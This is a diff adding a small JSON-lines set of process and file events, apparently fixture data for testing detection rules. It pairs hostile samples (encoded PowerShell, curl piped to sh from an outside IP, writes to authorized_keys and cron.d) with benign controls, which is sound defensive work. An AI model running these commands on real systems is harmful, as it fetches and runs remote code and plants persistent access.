@@ -1,0 +1,8 @@
+{"EventID": 4688, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -ENC SQBFAFgA", "ParentImage": "C:\\Windows\\explorer.exe"}
+{"EventID": 4688, "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c dir"}
+{"Image": "/usr/bin/bash", "CommandLine": "bash -c 'curl -s http://203.0.113.9/i.sh | sh'", "User": "www-data"}
+{"Image": "/usr/bin/curl", "CommandLine": "curl -o page.html http://example.test/"}
+{"Image": "/usr/bin/python3", "TargetFilename": "/home/dev/.ssh/authorized_keys"}
+{"Image": "/usr/sbin/sshd", "TargetFilename": "/home/dev/.ssh/authorized_keys"}
+{"Image": "/bin/sh", "TargetFilename": "/etc/cron.d/updater"}
+{"Image": "/usr/bin/dpkg", "TargetFilename": "/etc/cron.d/logrotate"}
